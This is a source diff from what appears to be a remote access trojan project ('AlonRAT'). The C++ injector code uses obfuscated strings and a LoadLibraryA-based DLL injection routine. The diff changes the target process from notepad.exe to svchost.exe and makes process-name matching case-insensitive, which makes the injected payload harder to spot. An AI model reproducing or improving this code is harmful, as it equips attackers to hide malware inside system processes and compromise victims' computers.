@@ -3,9 +3,10 @@
 #include <tlhelp32.h>
 #include "utils.h"
 #include <iostream>
+#include <algorithm>
 
 #define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Release\\AlonRAT.dll")
-#define PROCESS_NAME OBFUSCATE("notepad.exe")
+#define PROCESS_NAME OBFUSCATE("svchost.exe")
 
 bool inject(DWORD pid, const char* dll_store_path)
 {
@@ -19,7 +20,6 @@ bool inject(DWORD pid, const char* dll_store_path)
     if (hProcess == NULL) {
         return false;
     }
-
     // Get the address of LoadLibraryA in the target process
     LPVOID loadLibraryAddr = (LPVOID)get_proc_address(get_module_handle(OBFUSCATE(L"kernel32.dll")), OBFUSCATE("LoadLibraryA"));
     if (loadLibraryAddr == NULL) {
@@ -63,10 +63,11 @@ DWORD get_pid(const char* process_name) {
     HANDLE hSnapshot = create_toolhelp_snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
-
     if (process32_first(hSnapshot, &pe32)) {
         do {
-            if (strcmp(reinterpret_cast<char*>(pe32.szExeFile), process_name) == 0) {
+            std::string name = std::string(reinterpret_cast<char*>(pe32.szExeFile));
+            std::transform(name.begin(), name.end(), name.begin(), ::tolower); // to lower
+            if (strcmp(name.c_str(), process_name) == 0) {
                 pid = pe32.th32ProcessID;
                 break;
             }
